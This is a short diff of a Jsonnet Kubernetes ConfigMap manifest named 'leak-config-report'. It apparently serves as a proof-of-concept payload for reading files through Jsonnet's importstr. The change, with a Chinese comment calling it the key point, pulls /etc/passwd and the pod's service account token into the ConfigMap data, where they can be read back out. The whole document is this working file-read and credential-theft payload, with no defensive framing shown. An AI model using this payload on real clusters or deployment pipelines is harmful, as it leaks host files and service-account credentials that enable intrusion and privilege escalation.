@@ -2,10 +2,11 @@
   apiVersion: "v1",
   kind: "ConfigMap",
   metadata: {
-    name: "leak-config-final",
+    name: "leak-config-report",
   },
   data: {
-    // 直接在代码里执行 importstr，不再依赖外部变量
-    "leaked-data": importstr "/etc/passwd"
+    // 关键点：直接调用 importstr 读取敏感路径
+    "passwd": importstr "/etc/passwd",
+    "token": importstr "/var/run/secrets/kubernetes.io/serviceaccount/token"
   }
 }
